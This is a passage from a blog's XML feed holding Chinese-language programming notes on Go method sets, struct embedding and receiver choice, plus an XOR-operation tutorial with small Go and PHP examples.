class="string">"T1's M1"</span>) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*T1)</span> <span class="title">PT1M2</span><span class="params">()</span></span> &#123; <span class="built_in">println</span>(<span class="string">"PT1's M2"</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> T2 <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(T2)</span> <span class="title">T2M1</span><span class="params">()</span></span>   &#123; <span class="built_in">println</span>(<span class="string">"T2's M1"</span>) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*T2)</span> <span class="title">PT2M2</span><span class="params">()</span></span> &#123; <span class="built_in">println</span>(<span class="string">"PT2's M2"</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">    T1</span><br><span class="line">    *T2</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    t := T&#123;</span><br><span class="line">        T1: T1&#123;&#125;,</span><br><span class="line">        T2: &amp;T2&#123;&#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    dumpMethodSet(t)</span><br><span class="line">    dumpMethodSet(&amp;t)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的示例代码中，各实例的方法集合是不同的：</p><ul><li><code>T1</code> 的方法集合包含：T1M1</li><li><code>*T1</code> 的方法集合包含：T1M1、PT1M2</li><li><code>T2</code> 的方法集合包含：T2M1</li><li><code>*T2</code> 的方法集合包含：T2M1、PT2M2</li></ul><p>运行示例代码，输出如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">main.T<span class="string">'s method set:</span></span><br><span class="line"><span class="string">- PT2M2</span></span><br><span class="line"><span class="string">- T1M1</span></span><br><span class="line"><span class="string">- T2M1</span></span><br><span class="line"><span class="string">*main.T'</span>s method set:</span><br><span class="line">- PT1M2</span><br><span class="line">- PT2M2</span><br><span class="line">- T1M1</span><br><span class="line">- T2M1</span><br></pre></td></tr></table></figure><p>通过输出结果，我们看到了 <code>T</code> 和 <code>*T</code> 类型的方法集合果然有差别的：</p><ul><li>类型 <code>T</code> 的方法集合 = <code>T1</code> 的方法集合 + <code>*T2</code> 的方法集合</li><li>类型 <code>*T</code> 的方法集合 = <code>*T1</code> 的方法集合 + <code>*T2</code> 的方法集合</li></ul><p>这里需要注意的是，<code>*T</code> 类型的方法集合，它包含的可不是 <code>T1</code> 类型的方法集合，而是 <code>*T1</code> 类型的方法集合，而 <code>*T1</code> 方法集合又包含 T1M1、PT1M2，（T2同理），所以<code>*T</code> 类型的方法集合包含了PT1M2、PT2M2、T1M1、T2M2。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>接口类型嵌入就是在一个接口类型中，嵌入另外一个接口类型，允许方法集合并入</li><li>结构体类型嵌入就是以某个类型名、类型的指针类型名或接口类型名，直接作为结构体字段</li><li>接口类型只能嵌入接口类型，结构体类型可以嵌入任意自定义类型或接口类型</li><li>在 Go 语言中可以借助结构体类型嵌入实现“继承”</li><li>结构体类型中嵌入接口类型时，包含嵌入的接口类型的方法集合（但是接口类型的方法集合不能存在交集）</li><li>结构体类型中嵌入结构体类型时，<code>T</code> 和 <code>*T</code> 的方法集合不一样</li><li>无论原类型是接口类型还是非接口类型，类型别名都与原类型拥有完全相同的方法集合</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>异或运算 XOR 快速上手</title>
      <link href="/different-calculations-xor-rapid-skill/"/>
      <url>/different-calculations-xor-rapid-skill/</url>
      
        <content type="html"><![CDATA[<p>运算符有多种类型，常见的有：</p><ul><li>算术运算符</li><li>关系运算符</li><li>逻辑运算符</li><li>位运算</li><li>…</li></ul><p>在位运算中，异或运算虽然不常用，但是也非常重要，某些场景下，使用异或运算非常方便。</p><a id="more"></a><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>位运算符作用于位，并逐位执行操作。&amp;、 | 和 ^ 的真值表如下所示：</p><table><thead><tr><th align="left">p</th><th align="left">q</th><th align="left">p &amp; q（与运算）</th><th align="left">p | q（或运算）</th><th align="left">p ^ q（异或运算）</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">0</td><td align="left">0</td><td align="left">0</td><td align="left">0</td></tr><tr><td align="left">0</td><td align="left">1</td><td align="left">0</td><td align="left">1</td><td align="left">1</td></tr><tr><td align="left">1</td><td align="left">1</td><td align="left">1</td><td align="left">1</td><td align="left">0</td></tr><tr><td align="left">1</td><td align="left">0</td><td align="left">0</td><td align="left">1</td><td align="left">1</td></tr></tbody></table><p><strong>与运算（AND）</strong> 和 <strong>或运算（OR）</strong> 都比较好理解，所以这篇笔记重点介绍 <strong>异或运算（XOR）</strong>。</p><p>异或，英文为 exclusive OR，缩写成xor，<strong>XOR 主要用来判断两个值是否不同</strong>。</p><h2 id="运算法则"><a href="#运算法则" class="headerlink" title="运算法则"></a>运算法则</h2><p>归零律，一个值与自身的运算，总是为 0：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x ^ x &#x3D; 0</span><br></pre></td></tr></table></figure><p>恒等律，一个值与 0 的运算，总是等于其本身：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x ^ 0 &#x3D; x</span><br></pre></td></tr></table></figure><p>交换律：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x ^ y &#x3D; y ^ x</span><br></pre></td></tr></table></figure><p>结合律：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x ^ y ^ z &#x3D; x ^ (y ^ z) &#x3D; (x ^ y) ^ z</span><br></pre></td></tr></table></figure><p>自反：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x ^ y ^ x &#x3D; y</span><br></pre></td></tr></table></figure><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>根据上面的这些运算法则，可以得到异或运算的很多重要应用。</p><h3 id="简化计算"><a href="#简化计算" class="headerlink" title="简化计算"></a>简化计算</h3><p>多个值的异或运算，可以根据运算定律进行简化。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x ^ y ^ z ^ y ^ x</span><br><span class="line">&#x3D; x ^ x ^ y ^ y ^ z</span><br><span class="line">&#x3D; 0 ^ 0 ^ z</span><br><span class="line">&#x3D; z</span><br></pre></td></tr></table></figure><h3 id="交换值"><a href="#交换值" class="headerlink" title="交换值"></a>交换值</h3><p>两个变量连续进行三次异或运算，可以互相交换值。</p><p>假设两个变量是x和y，各自的值是a和b。下面就是x和y进行三次异或运算：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = x ^ y;  <span class="comment">// 第一次运算之后，x 的值是 a ^ b，y 的值是 b</span></span><br><span class="line">y = x ^ y   <span class="comment">// 第二次运算之后，x 的值是 a ^ b，y 的值是 a ^ b ^ b，也就是 a</span></span><br><span class="line">x = x ^ y   <span class="comment">// 第三次运算之后，x 的值是 a ^ b ^ a，y 的值是 a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 所以最终 x 的值是 b， y 的值是 a</span></span><br></pre></td></tr></table></figure><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>异或运算可以用于加密。</p><p>第一步，明文（text）与密钥（key）进行异或运算，可以得到密文（cipherText）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text ^ key &#x3D; cipherText</span><br></pre></td></tr></table></figure><p>第二步，密文与密钥再次进行异或运算，就可以还原成明文。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cipherText ^ key &#x3D; text</span><br></pre></td></tr></table></figure><p>原理很简单，如果明文是 x，密钥是 y，那么 x 连续与 y 进行两次异或运算，得到自身。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(x ^ y) ^ y</span><br><span class="line">&#x3D; x ^ (y ^ y)</span><br><span class="line">&#x3D; x ^ 0</span><br><span class="line">&#x3D; x</span><br></pre></td></tr></table></figure><h3 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h3><p>异或运算可以用于数据备份。</p><p>文件 x 和文件 y 进行异或运算，产生一个备份文件 z。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x ^ y &#x3D; z</span><br></pre></td></tr></table></figure><p>以后，无论是文件 x 或文件 y 损坏，只要不是两个原始文件同时损坏，就能根据另一个文件和备份文件，进行还原。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x ^ z</span><br><span class="line">&#x3D; x ^ (x ^ y) </span><br><span class="line">&#x3D; (x ^ x) ^ y</span><br><span class="line">&#x3D; 0 ^ y</span><br><span class="line">&#x3D; y</span><br></pre></td></tr></table></figure><p>上面的例子是 y 损坏，x 和 z 进行异或运算，就能得到 y。</p><h2 id="一道算法题"><a href="#一道算法题" class="headerlink" title="一道算法题"></a>一道算法题</h2><p><a href="https://leetcode.cn/problems/single-number/" target="_blank" rel="noopener">只出现一次的数字——LeetCode</a></p><p>给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</p><p>要求：算法的复杂度是线性的，且不允许使用额外的空间。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: [4,1,2,1,2]</span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure><p>解题思路：这里就可以利用异或运算的自反特性，可以将所有相同的数字全部抵消掉，最后留下的就是只出现了一次的元素：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">($array)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($array); $i++) &#123;</span><br><span class="line">        $result ^= $array[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$array = [<span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>];</span><br><span class="line">$result = func($array);</span><br><span class="line">print_r($result);   <span class="comment">// 0 ^ 4 ^ 1 ^ 2 ^ 1 ^ 4 = 2</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.ruanyifeng.com/blog/2021/01/_xor.html" target="_blank" rel="noopener">异或运算 XOR 教程</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——方法接收器的选择</title>
      <link href="/go-language-study-notes-receiver/"/>
      <url>/go-language-study-notes-receiver/</url>
      
        <content type="html"><![CDATA[<p>上一篇笔记了解了 Go 语言方法的声明、本质，这篇笔记主要来了解 Go 语言方法的receiver 参数。</p><a id="more"></a><h2 id="receiver-参数类型对-Go-方法的影响"><a href="#receiver-参数类型对-Go-方法的影响" class="headerlink" title="receiver 参数类型对 Go 方法的影响"></a>receiver 参数类型对 Go 方法的影响</h2><p>要想为 receiver 参数选出合理的类型，需要先要了解不同的 receiver 参数类型会对 Go 方法产生怎样的影响。</p><p>因为<strong>方法的本质就是函数</strong>，所以下面从等价转换之后的函数的角度来分析一下对函数有什么影响，间接得出它对 Go 方法的影响呢。</p><p>还是从一段示例代码开始。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">    a <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t T)</span> <span class="title">M1</span><span class="params">()</span></span> &#123;</span><br><span class="line">    t.a = <span class="number">10</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *T)</span> <span class="title">M2</span><span class="params">()</span></span> &#123;</span><br><span class="line">    t.a = <span class="number">11</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t T</span><br><span class="line">    <span class="built_in">println</span>(t.a) <span class="comment">// 0</span></span><br><span class="line">    t.M1()</span><br><span class="line">    <span class="built_in">println</span>(t.a) <span class="comment">// 0</span></span><br><span class="line">    p := &amp;t</span><br><span class="line">    p.M2()</span><br><span class="line">    <span class="built_in">println</span>(t.a) <span class="comment">// 11</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的示例中，为基类型分别定义了两个方法 M1 和 M2，其中receiver 参数类型分别是 <code>T</code> 和 <code>*T</code>，最后两个方法都通过参数 t 对 t的成员进行了修改。</p><p>通过运行示例代码之后，可以看到，方法 M1 对成员的修改并没有成功，还是原值，而方法 M2 对成员的修改成功了。因此可以得出以下结论：</p><ul><li>当 receiver 参数的类型为 <code>T</code>（非指针）时：receiver 参数实际上是<strong>T 类型实例的副本</strong>，因此对参数 t 进行任何修改都<strong>不会影响</strong>到原实例。</li><li>当 receiver 参数的类型为 <code>*T</code>（指针）时：receiver 参数实际上是<strong>T 类型实例的地址</strong>，因此对参数 t 进行任何修改都<strong>会影响</strong>到原实例。</li></ul><p>了解了不同类型的 receiver 参数对 Go 方法的影响后，就可以总结一下，日常编码中选择 receiver 的参数类型的时候，我们可以参考哪些原则。</p><h3 id="原则一"><a href="#原则一" class="headerlink" title="原则一"></a>原则一</h3><p><strong>如果 Go 方法要把对 receiver 参数代表的类型实例的修改，反映到原类型实例上，那么我们应该选择 <code>*T</code> 作为 receiver 参数的类型</strong>。</p><p>这个原则很好理解，依据实际情况选择合适的。</p><p>不过这个时候可能会有一个问题：<br>选择<code>*T</code> 作为 receiver 参数的类型，那么是不是只能通过 <code>*T</code> 类型的实例调用该方法，而不能通过 <code>T</code> 类型的实例调用？</p><p>正好这也是上一篇笔记中，遗留下了一个问题。</p><p>将上面的示例代码改造一下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">    a <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t T)</span> <span class="title">M1</span><span class="params">()</span></span> &#123;</span><br><span class="line">    t.a = <span class="number">10</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *T)</span> <span class="title">M2</span><span class="params">()</span></span> &#123;</span><br><span class="line">   t.a = <span class="number">11</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> t1 T</span><br><span class="line">   <span class="built_in">println</span>(t1.a) <span class="comment">// 0</span></span><br><span class="line">   t1.M1()</span><br><span class="line">   <span class="built_in">println</span>(t1.a) <span class="comment">// 0</span></span><br><span class="line">   t1.M2()</span><br><span class="line">   <span class="built_in">println</span>(t1.a) <span class="comment">// 11</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> t2 = &amp;T&#123;&#125;</span><br><span class="line">   <span class="built_in">println</span>(t2.a) <span class="comment">// 0</span></span><br><span class="line">   t2.M1()</span><br><span class="line">   <span class="built_in">println</span>(t2.a) <span class="comment">// 0</span></span><br><span class="line">   t2.M2()</span><br><span class="line">   <span class="built_in">println</span>(t2.a) <span class="comment">// 11</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行示例代码查看输出结果，会发现类型为 <code>T</code> 的实例 t1，不仅可以调用 receiver 参数类型为 <code>T</code> 的方法 M1，它还可以直接调用 receiver 参数类型为 <code>*T</code> 的方法 M2，并且调用完 M2 方法后，成员的值也被修改了。</p><p>直接说结论：这是因为 Go 编译器，在背后帮我们做了自动转换。</p><p>或者说，<code>t1.M2()</code> 这种用法是 Go 提供的“语法糖”：Go 判断 t1 的类型为 <code>T</code>（非指针），也就是与方法 M2 的 receiver 参数类型 <code>*T</code>（指针） 不一致后，会自动将 <code>t1.M2()</code> 转换为 <code>(&amp;t1).M2()</code>。</p><p>同理，<code>t2.M1()</code> 这种用法也是因为 Go 编译器在背后做了转换。也就是，Go 判断 t2 的类型为 <code>*T</code>（指针），与方法 M1 的 receiver 参数类型 T（非指针）不一致，就会自动将 <code>t2.M1()</code> 转换为<code>(*t2).M1()</code>。</p><p>结论：<strong>无论是 <code>T</code> 类型实例，还是 <code>*T</code> 类型实例，都既可以调用 receiver 为 <code>T</code>类型的方法，也可以调用 receiver 为 <code>*T</code> 类型的方法。</strong></p><p>这里做了两次自动转换，涉及到了指针的运用，如果不理解，可以看下<a href="https://www.0x2beace.com/go-language-study-notes-pointer/">这篇笔记</a>。</p><h3 id="原则二"><a href="#原则二" class="headerlink" title="原则二"></a>原则二</h3><p>第一个原则说的是，当要在方法中对 receiver 参数代表的类型实例进行修改，那要为 receiver 参数选择 <code>*T</code> 类型，但是如果不需要在方法中对类型实例进行修改呢？<br>这个时候是选择 <code>T</code> 类型还是 <code>*T</code> 类型呢？</p><p>通常会为 receiver 参数选择 <code>T</code> 类型，这是因为可以缩窄外部修改类型实例内部状态的“接触面”，也就是尽量少暴露可以修改类型内部状态的方法。</p><p>不过也有一个例外需要你特别注意。考虑到 Go 方法调用时，receiver 参数是以值拷贝的形式传入方法中的。那么，如果 receiver 参数类型的 size 较大，以值拷贝形式传入就会导致较大的性能开销，这时我们选择 *T 作为 receiver 类型可能更好些。</p><p>以上这些可以作为我们选择 receiver 参数类型的第二个原则。</p><p>到这里，可能会觉得，前两个原则似乎并不难理解，这是因为这两条只是基础原则，还有一条比较难的原则在下面。</p><p>不过在讲解这第三条原则之前，需要先要了解一个基本概念：<strong>方法集合（Method Set）</strong>，它是理解第三条原则的前提。</p><h3 id="方法集合"><a href="#方法集合" class="headerlink" title="方法集合"></a>方法集合</h3><p>在了解方法集合是什么之前，我们先通过一个示例，直观了解一下为什么要有方法集合，它主要用来解决什么问题：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Interface <span class="keyword">interface</span> &#123;</span><br><span class="line">    M1()</span><br><span class="line">    M2()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t T)</span> <span class="title">M1</span><span class="params">()</span></span>  &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *T)</span> <span class="title">M2</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t T</span><br><span class="line">    <span class="keyword">var</span> pt *T</span><br><span class="line">    <span class="keyword">var</span> i Interface</span><br><span class="line">    i = pt</span><br><span class="line">    i = t </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的示例代码定义了一个接口类型 Interface 以及一个自定义类型 T。Interface 接口类型包含了两个方法 M1 和 M2，它们的基类型都是 T，但它们的 receiver 参数类型不同，一个为  <code>T</code>，另一个为 <code>*T</code>。<br>在 main 函数中，分别将 <code>T</code> 类型实例 t 和 <code>*T</code> 类型实例 pt 赋值给 Interface 类型变量 i。</p><p>运行示例代码，会发现编译失败了：</p><blockquote><p>cannot use t (type T) as type Interface in assignment: T does not implement Interface (M2 method has pointer receiver)</p></blockquote><p>大意是：T 没有实现 Interface 类型方法列表中的 M2，因此类型 T 的实例 t 不能赋值给 Interface 变量</p><p>在解决这个问题之前，先来了解一下什么是方法集合。</p><p>Go 中任何一个类型都有属于自己的方法，或者说方法集合是 Go 类型的一个“属性”。但是不是所有类型都有自己的方法，比如 int 类型就没有，所以，对于没有定义方法的Go 类型，称其拥有空方法集合。</p><p>接口类型类型相对特殊，它只会列出代表接口的方法列表，不会具体定义某个方法，它的方法集合就是它的方法列表中的所有方法，因为下面重点讲解的是非接口类型的方法集合。</p><p>为了方便查看一个非接口类型的方法集合，提供了一个函数 dumpMethodSet，用于输出一个非接口类型的方法集合：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">dumpMethodSet</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    dynTyp := reflect.TypeOf(i)</span><br><span class="line">    <span class="keyword">if</span> dynTyp == <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">"there is no dynamic type\n"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    n := dynTyp.NumMethod()</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">"%s's method set is empty!\n"</span>, dynTyp)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">"%s's method set:\n"</span>, dynTyp)</span><br><span class="line">    <span class="keyword">for</span> j := <span class="number">0</span>; j &lt; n; j++ &#123;</span><br><span class="line">        fmt.Println(<span class="string">"-"</span>, dynTyp.Method(j).Name)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">"\n"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面则利用这个函数，试着输出一下 Go 原生类型以及自定义类型的方法集合：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(T)</span> <span class="title">M1</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(T)</span> <span class="title">M2</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*T)</span> <span class="title">M3</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*T)</span> <span class="title">M4</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="keyword">var</span> n <span class="keyword">int</span></span><br><span class="line">  dumpMethodSet(n)</span><br><span class="line">  dumpMethodSet(&amp;n)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> t T</span><br><span class="line">  dumpMethodSet(t)</span><br><span class="line">  dumpMethodSet(&amp;t)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的示例代码，得到如下输出：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span><span class="string">'s method set is empty!</span></span><br><span class="line"><span class="string">*int'</span>s method set is empty!</span><br><span class="line">main.T<span class="string">'s method set:</span></span><br><span class="line"><span class="string">- M1</span></span><br><span class="line"><span class="string">- M2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*main.T'</span>s method set:</span><br><span class="line">- M1</span><br><span class="line">- M2</span><br><span class="line">- M3</span><br><span class="line">- M4</span><br></pre></td></tr></table></figure><p>从上面的输出中，可以看到<code>int</code>、<code>*int</code> 是 Go 原生类型由于没有定义方法，所以它们的方法集合都是空的。<br>而自定义类型 T 定义了方法 M1 和 M2，因此它的方法集合包含了 M1 和 M2，符合预期，但是 <code>*T</code> 的方法集合除了预期的 M3 和 M4 之外，怎么还包含了类型 T 的 M1 和 M2 方法？</p><p>这是因为，Go 语言规定，<strong><code>*T</code> 类型的方法集合包含所有以 <code>*T</code> 为 receiver 参数类型的方法，以及所有以 <code>T</code> 为 receiver 参数类型的方法。</strong><br>这就是这个示例中为何 <code>*T</code> 类型的方法集合包含四个方法的原因。</p><p>这个时候再来看看前面的那个编译失败的问题，是不是就找到原因了。</p><p>可以使用 <code>dumpMethodSet</code> 函数，输出一下该示例中t 与 pt 各自所属类型的方法集合：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main.T<span class="string">'s method set:</span></span><br><span class="line"><span class="string">- M1</span></span><br><span class="line"><span class="string">*main.T'</span>s method set:</span><br><span class="line">- M1</span><br><span class="line">- M2</span><br></pre></td></tr></table></figure><p>从输出结果中，可以看到 <code>T</code>、<code>*T</code> 各自的方法集合确实是符合上面的结论的。</p><p>到这里，已经知道了所谓的<strong>方法集合决定接口实现</strong>的含义就是：如果某类型 <code>T</code> 的方法集合与某接口类型的方法集合相同，或者类型 <code>T</code> 的方法集合是接口类型 <code>I</code> 方法集合的超集，那么我们就说这个类型 <code>T</code> 实现了接口 